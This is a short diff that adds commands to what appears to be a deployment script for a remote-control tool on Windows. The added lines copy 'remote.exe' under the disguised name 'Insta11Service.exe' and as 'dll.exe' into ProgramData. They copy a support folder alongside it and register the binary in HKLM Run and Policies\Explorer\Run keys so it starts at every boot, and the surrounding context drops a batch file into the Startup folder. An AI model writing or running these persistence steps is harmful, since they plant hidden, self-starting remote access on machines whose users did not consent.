@@ -34,3 +34,19 @@ cmd:reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policie
 
 upfile:D:\remotefile\dll>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\dll
 upfile:D:\remotefile\ick.bat>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ick.bat
+
+
+
+--无jdk
+cmd:copy /Y remote.exe "C:\ProgramData\Microsoft\Windows\Insta11Service.exe"
+cmd:md "C:\ProgramData\Microsoft\Windows\windows"
+cmd:xcopy windows "C:\ProgramData\Microsoft\Windows\windows" /S /E /Y /Q
+cmd:reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v two /t REG_SZ /d C:\ProgramData\Microsoft\Windows\Insta11Service.exe /f
+--cmd:reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v two /f
+
+
+cmd:copy /Y remote.exe "C:\ProgramData\dll.exe"
+cmd:md "C:\ProgramData\windows"
+cmd:xcopy windows "C:\ProgramData\windows" /S /E /Y /Q
+cmd:reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v one /t REG_SZ /d C:\ProgramData\dll.exe /f
+--cmd:reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v one /f
